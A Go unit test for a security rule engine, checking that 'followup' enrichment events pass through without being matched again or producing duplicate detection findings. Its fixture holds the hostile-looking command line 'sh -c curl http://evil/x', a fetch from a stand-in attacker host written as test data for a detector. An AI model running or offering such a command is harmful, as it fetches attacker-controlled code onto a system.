package ruleengine

import (
	"context"
	"testing"
	"time"

	"github.com/t3rmit3/slither/agent/internal/telemetry"
	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

// Followup events are deferred enrichments of prior events; the original has
// already been rule-matched and re-matching would double-count detections.
func TestEngineSkipsFollowupEvents(t *testing.T) {
	rules, err := CompileRules([]*ruleast.Rule{compileFixture(t, curlSigma)})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	eng := New(rules, telemetry.NewCounters()).(*engine)

	matching := processActivity("/bin/sh", "sh -c curl http://evil/x")
	matching.Metadata.Labels = []string{"followup"}
	matching.Metadata.CorrelationUID = "orig-uid"

	in := make(chan ocsf.Event, 1)
	in <- matching
	close(in)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}

	var events, findings int
	for out := range eng.Output() {
		switch out.(type) {
		case *ocsf.DetectionFinding:
			findings++
		default:
			events++
		}
	}
	if events != 1 {
		t.Errorf("events passed through = %d, want 1", events)
	}
	if findings != 0 {
		t.Errorf("followup produced %d findings, want 0", findings)
	}
}
